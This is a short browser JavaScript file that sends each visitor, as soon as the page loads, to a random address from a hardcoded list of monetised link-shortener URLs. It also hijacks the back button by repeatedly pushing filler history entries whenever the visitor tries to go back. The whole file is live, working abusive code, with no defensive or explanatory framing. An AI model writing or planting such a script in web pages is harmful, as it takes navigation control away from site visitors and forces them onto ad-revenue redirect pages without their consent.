var urls = ["https://besargaji.com/yureC5LkGE",
            "https://link.bicolink.net/iSNC7TAv",
            "https://arahlink.id/FNQXk",
            "https://ouo.io/lcR6Hs",
            "https://adbull.me/oF549D",
            "https://to.aoutoqw.xyz/UIcBUM",
            "https://go.aoutoqw.xyz/bxpbcIzw"];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

